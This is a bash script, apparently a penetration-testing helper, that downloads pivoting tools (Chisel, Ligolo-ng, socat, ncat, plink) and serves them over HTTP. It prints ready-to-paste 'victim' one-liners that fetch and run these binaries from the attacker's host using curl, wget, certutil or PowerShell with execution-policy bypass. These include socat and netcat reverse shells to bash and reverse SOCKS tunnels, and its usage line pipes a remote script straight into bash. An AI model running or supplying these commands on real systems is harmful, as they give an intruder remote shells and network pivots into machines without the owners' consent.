#!/bin/bash

# Pivot Tool Server - Download, Serve, Execute
# Usage: curl -sL https://raw.githubusercontent.com/xl337x/pivoting/main/pivot.sh | bash

clear
echo "========================================"
echo "       PIVOT TOOL SERVER"
echo "========================================"
echo ""

# Get IP
read -p "[?] Your IP: " IP
if [ -z "$IP" ]; then
    echo "[-] IP required!"
    exit 1
fi

# Random port
PORT=$(shuf -i 8000-65000 -n 1)

# Setup directory
mkdir -p /tmp/pivot_serve
cd /tmp/pivot_serve

echo ""
echo "========================================"
echo " SELECT TOOL"
echo "========================================"
echo " 1) Chisel"
echo " 2) Ligolo-ng"
echo " 3) Socat"
echo " 4) Netcat"
echo " 5) Plink"
echo " 6) All tools"
echo "========================================"
echo ""
read -p "[?] Choice [1-6]: " TOOL

case $TOOL in
    1)
        echo ""
        echo "[*] Downloading Chisel..."
        curl -sL https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_linux_amd64.gz | gunzip > chisel_linux 2>/dev/null
        chmod +x chisel_linux
        curl -sL https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_windows_amd64.gz | gunzip > chisel.exe 2>/dev/null
        echo "[+] Chisel downloaded!"
        echo ""
        echo "========================================"
        echo " VICTIM COMMANDS"
        echo "========================================"
        echo ""
        echo "--- LINUX ---"
        echo "curl http://$IP:$PORT/chisel_linux -o /tmp/c&&chmod +x /tmp/c&&/tmp/c client $IP:9001 R:socks"
        echo ""
        echo "wget http://$IP:$PORT/chisel_linux -O /tmp/c&&chmod +x /tmp/c&&/tmp/c client $IP:9001 R:socks"
        echo ""
        echo "--- WINDOWS ---"
        echo "certutil -urlcache -f http://$IP:$PORT/chisel.exe %TEMP%\\c.exe&&%TEMP%\\c.exe client $IP:9001 R:socks"
        echo ""
        echo "powershell -ep bypass -c \"iwr http://$IP:$PORT/chisel.exe -O \$env:TEMP\\c.exe;\$env:TEMP\\c.exe client $IP:9001 R:socks\""
        echo ""
        echo "========================================"
        echo " ATTACKER (run in another terminal)"
        echo "========================================"
        echo "chisel server -p 9001 --reverse"
        echo ""
        ;;
    2)
        echo ""
        echo "[*] Downloading Ligolo-ng..."
        curl -sL https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.5/ligolo-ng_agent_0.7.5_linux_amd64.tar.gz | tar xz 2>/dev/null
        mv agent ligolo_linux 2>/dev/null
        chmod +x ligolo_linux
        curl -sL https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.5/ligolo-ng_agent_0.7.5_windows_amd64.zip -o ligolo.zip 2>/dev/null
        unzip -qo ligolo.zip 2>/dev/null
        mv agent.exe ligolo.exe 2>/dev/null
        rm -f ligolo.zip 2>/dev/null
        echo "[+] Ligolo downloaded!"
        echo ""
        echo "========================================"
        echo " VICTIM COMMANDS"
        echo "========================================"
        echo ""
        echo "--- LINUX ---"
        echo "curl http://$IP:$PORT/ligolo_linux -o /tmp/a&&chmod +x /tmp/a&&/tmp/a -connect $IP:11601 -ignore-cert"
        echo ""
        echo "wget http://$IP:$PORT/ligolo_linux -O /tmp/a&&chmod +x /tmp/a&&/tmp/a -connect $IP:11601 -ignore-cert"
        echo ""
        echo "--- WINDOWS ---"
        echo "certutil -urlcache -f http://$IP:$PORT/ligolo.exe %TEMP%\\a.exe&&%TEMP%\\a.exe -connect $IP:11601 -ignore-cert"
        echo ""
        echo "powershell -ep bypass -c \"iwr http://$IP:$PORT/ligolo.exe -O \$env:TEMP\\a.exe;\$env:TEMP\\a.exe -connect $IP:11601 -ignore-cert\""
        echo ""
        echo "========================================"
        echo " ATTACKER (run in another terminal)"
        echo "========================================"
        echo "sudo ip tuntap add user \$(whoami) mode tun ligolo"
        echo "sudo ip link set ligolo up"
        echo "ligolo-ng -selfcert -laddr 0.0.0.0:11601"
        echo ""
        ;;
    3)
        echo ""
        echo "[*] Downloading Socat..."
        curl -sL https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -o socat_linux
        chmod +x socat_linux
        echo "[+] Socat downloaded!"
        echo ""
        echo "========================================"
        echo " VICTIM COMMANDS (Linux only)"
        echo "========================================"
        echo ""
        echo "# Reverse Shell"
        echo "curl http://$IP:$PORT/socat_linux -o /tmp/s&&chmod +x /tmp/s&&/tmp/s TCP:$IP:4444 EXEC:/bin/bash"
        echo ""
        echo "# Port Forward (local 8080 to remote 80)"
        echo "curl http://$IP:$PORT/socat_linux -o /tmp/s&&chmod +x /tmp/s&&/tmp/s TCP-LISTEN:8080,fork TCP:TARGET:80"
        echo ""
        echo "========================================"
        echo " ATTACKER (run in another terminal)"
        echo "========================================"
        echo "nc -lvnp 4444"
        echo "# or"
        echo "socat -d -d TCP-LISTEN:4444 STDOUT"
        echo ""
        ;;
    4)
        echo ""
        echo "[*] Downloading Netcat..."
        curl -sL https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/ncat -o nc_linux
        chmod +x nc_linux
        echo "[+] Netcat downloaded!"
        echo ""
        echo "========================================"
        echo " VICTIM COMMANDS (Linux only)"
        echo "========================================"
        echo ""
        echo "# Reverse Shell"
        echo "curl http://$IP:$PORT/nc_linux -o /tmp/n&&chmod +x /tmp/n&&/tmp/n $IP 4444 -e /bin/bash"
        echo ""
        echo "========================================"
        echo " ATTACKER (run in another terminal)"
        echo "========================================"
        echo "nc -lvnp 4444"
        echo ""
        ;;
    5)
        echo ""
        echo "[*] Downloading Plink..."
        curl -sL https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe -o plink.exe
        echo "[+] Plink downloaded!"
        echo ""
        echo "========================================"
        echo " VICTIM COMMANDS (Windows only)"
        echo "========================================"
        echo ""
        echo "# SSH Tunnel"
        echo "certutil -urlcache -f http://$IP:$PORT/plink.exe %TEMP%\\p.exe&&%TEMP%\\p.exe -ssh $IP -l user -pw pass -R 9050:127.0.0.1:9050 -N"
        echo ""
        echo "powershell -ep bypass -c \"iwr http://$IP:$PORT/plink.exe -O \$env:TEMP\\p.exe;\$env:TEMP\\p.exe -ssh $IP -l user -pw pass -R 9050:127.0.0.1:9050 -N\""
        echo ""
        echo "========================================"
        echo " ATTACKER"
        echo "========================================"
        echo "# Make sure SSH is running on your box"
        echo "sudo systemctl start ssh"
        echo ""
        ;;
    6)
        echo ""
        echo "[*] Downloading ALL tools..."
        curl -sL https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_linux_amd64.gz | gunzip > chisel_linux 2>/dev/null
        chmod +x chisel_linux
        curl -sL https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_windows_amd64.gz | gunzip > chisel.exe 2>/dev/null
        curl -sL https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.5/ligolo-ng_agent_0.7.5_linux_amd64.tar.gz | tar xz 2>/dev/null
        mv agent ligolo_linux 2>/dev/null
        chmod +x ligolo_linux
        curl -sL https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.5/ligolo-ng_agent_0.7.5_windows_amd64.zip -o ligolo.zip 2>/dev/null
        unzip -qo ligolo.zip 2>/dev/null
        mv agent.exe ligolo.exe 2>/dev/null
        rm -f ligolo.zip
        curl -sL https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -o socat_linux
        chmod +x socat_linux
        curl -sL https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/ncat -o nc_linux
        chmod +x nc_linux
        curl -sL https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe -o plink.exe
        echo "[+] All tools downloaded!"
        echo ""
        echo "========================================"
        echo " VICTIM COMMANDS - LINUX"
        echo "========================================"
        echo ""
        echo "# Chisel SOCKS"
        echo "curl http://$IP:$PORT/chisel_linux -o /tmp/c&&chmod +x /tmp/c&&/tmp/c client $IP:9001 R:socks"
        echo ""
        echo "# Ligolo Agent"
        echo "curl http://$IP:$PORT/ligolo_linux -o /tmp/a&&chmod +x /tmp/a&&/tmp/a -connect $IP:11601 -ignore-cert"
        echo ""
        echo "# Socat Reverse Shell"
        echo "curl http://$IP:$PORT/socat_linux -o /tmp/s&&chmod +x /tmp/s&&/tmp/s TCP:$IP:4444 EXEC:/bin/bash"
        echo ""
        echo "# Netcat Reverse Shell"
        echo "curl http://$IP:$PORT/nc_linux -o /tmp/n&&chmod +x /tmp/n&&/tmp/n $IP 4444 -e /bin/bash"
        echo ""
        echo "========================================"
        echo " VICTIM COMMANDS - WINDOWS"
        echo "========================================"
        echo ""
        echo "# Chisel SOCKS"
        echo "certutil -urlcache -f http://$IP:$PORT/chisel.exe %TEMP%\\c.exe&&%TEMP%\\c.exe client $IP:9001 R:socks"
        echo ""
        echo "# Ligolo Agent"
        echo "certutil -urlcache -f http://$IP:$PORT/ligolo.exe %TEMP%\\a.exe&&%TEMP%\\a.exe -connect $IP:11601 -ignore-cert"
        echo ""
        echo "# Plink SSH"
        echo "certutil -urlcache -f http://$IP:$PORT/plink.exe %TEMP%\\p.exe&&%TEMP%\\p.exe -ssh $IP -l user -pw pass -R 9050:127.0.0.1:9050 -N"
        echo ""
        echo "========================================"
        echo " ATTACKER SETUP"
        echo "========================================"
        echo "chisel server -p 9001 --reverse"
        echo "ligolo-ng -selfcert -laddr 0.0.0.0:11601"
        echo "nc -lvnp 4444"
        echo ""
        ;;
    *)
        echo "[-] Invalid choice!"
        exit 1
        ;;
esac

echo "========================================"
echo " FILES READY"
echo "========================================"
ls -lah /tmp/pivot_serve/ 2>/dev/null | grep -v "^total" | grep -v "^d"
echo ""
echo "========================================"
echo " SERVING: http://$IP:$PORT/"
echo " Ctrl+C to stop"
echo "========================================"
echo ""

python3 -m http.server $PORT
